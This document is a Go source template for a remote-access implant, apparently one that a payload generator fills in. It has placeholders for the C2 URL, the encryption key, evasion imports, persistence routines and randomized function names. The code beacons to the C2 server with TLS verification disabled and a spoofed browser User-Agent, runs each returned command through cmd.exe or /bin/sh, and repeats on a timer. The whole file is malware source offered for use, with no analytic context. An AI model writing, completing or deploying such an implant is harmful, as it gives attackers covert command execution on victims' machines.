package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
	{{EVASION_IMPORTS}}
)

const (
	C2_URL         = "{{C2_URL}}"
	ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
	SLEEP_INTERVAL = 5 * time.Second
	JITTER         = 2 * time.Second
)

// Main entry point
func {{MAIN_FUNC}}() {
	{{EVASION_FUNCTIONS}}
	{{PERSISTENCE_FUNCTIONS}}
	
	// Main C2 loop
	for {
		{{CONNECT_FUNC}}()
		time.Sleep(SLEEP_INTERVAL + time.Duration(randomJitter()))
	}
}

// Connect to C2 server and execute commands
func {{CONNECT_FUNC}}() {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	req, err := http.NewRequest("GET", C2_URL+"/beacon", nil)
	if err != nil {
		return
	}

	// Add custom headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, _ := ioutil.ReadAll(resp.Body)
		{{EXECUTE_FUNC}}(string(body))
	}
}

// Execute received command
func {{EXECUTE_FUNC}}(command string) string {
	if command == "" {
		return ""
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	return string(output)
}

// Generate random jitter
func randomJitter() int64 {
	return int64(JITTER.Seconds())
}

func main() {
	{{MAIN_FUNC}}()
}
